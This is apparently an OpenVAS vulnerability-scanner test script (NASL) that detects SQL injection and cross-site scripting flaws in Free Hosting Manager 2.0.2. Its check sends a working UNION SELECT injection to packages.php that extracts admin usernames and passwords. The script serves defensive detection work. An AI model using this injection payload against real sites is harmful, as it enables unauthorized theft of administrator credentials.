###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_free_hosting_manager_mult_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Free Hosting Manager Multiple Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to inject or manipulate
  SQL queries in the back-end database, allowing for the manipulation or
  disclosure of arbitrary data and execute arbitrary HTML or web script in
  a user's browser session in context of an affected site.
  Impact Level: Application";

tag_summary = "This host is installed with Free Hosting Manager and is prone to
  multiple vulnerabilities.";
tag_solution = "No solution or patch is available as of 25th March, 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.fhm-script.com";
tag_insight = "Multiple flaws due to,
  - The packages.php, tickets.php, viewaccount.php, reset.php scripts are not
    properly sanitizing user-supplied input to the 'id' and 'code' parameters.
  - Input passed via POST parameter to home.php and register.php scripts is
    not properly sanitizing before being used in a SQL query.
  - Input passed via ticket field is not properly sanitizing before being
    returned to the user.";
tag_affected = "Free Hosting Manager version 2.0.2 and prior";

if(description)
{
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_id(803446);
  script_version("$Revision: 11 $");
  script_bugtraq_id(56991,56754);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-03-25 14:43:46 +0530 (Mon, 25 Mar 2013)");
  script_name("Free Hosting Manager Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  script_xref(name : "URL" , value : "http://www.osvdb.com/88063");
  script_xref(name : "URL" , value : "http://www.osvdb.com/88621");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/80728");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/23028");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/118934");

  script_description(desc);
  script_summary("Check if Free Hosting Manager is vulnerable sql injection");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = "";
req = "";
res = "";
url = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Iterate over possible paths
foreach dir (make_list("", "/freehostingmanager", "/fhm", cgi_dirs()))
{
  ## Send and Recieve the response
  req = http_get(item:string(dir,"/admin/login.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req);

  ## Confirm the application
  if("Free Hosting Manager<" >< res)
  {
    ## Construct the attack request
    url = dir +"/clients/packages.php?id=-1'+UNION+ALL+SELECT+1,CONCAT"+
               "(username,char(58),password),3,4,5,6,7,8,9,10,11,12,13,"+
               "14,15,16,17,18,19+from+adminusers%23";

    if(http_vuln_check(port:port, url:url, check_header:TRUE,
           pattern:"<title>.*:.* - Advanced Package Details",
           extra_check:make_list(">Feature<", ">Limit<", ">Email Accounts<")))
    {
      security_hole(port);
      exit(0);
    }
  }
}
